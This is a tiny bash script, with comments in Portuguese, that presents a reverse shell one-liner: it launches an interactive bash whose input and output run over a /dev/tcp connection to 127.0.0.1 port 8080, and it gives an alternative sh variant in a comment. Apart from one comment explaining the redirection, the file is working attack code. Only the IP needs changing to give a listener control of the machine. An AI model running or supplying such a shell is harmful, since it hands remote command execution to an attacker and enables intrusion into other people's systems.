# Reverse shell one-liner bash (debian-based)

#!/bin/bash

bash -i </dev/tcp/127.0.0.1/8080 1>&0 2>&0
# stdin vindo da conexão interpretado pela bash com stdout e stderr retornado de volta pra conexão (socket tcp)

# ou.... sh -i 1>&/dev/tcp/127.0.0.1/8080 0<&1
# só funciona em alguns sistemas...
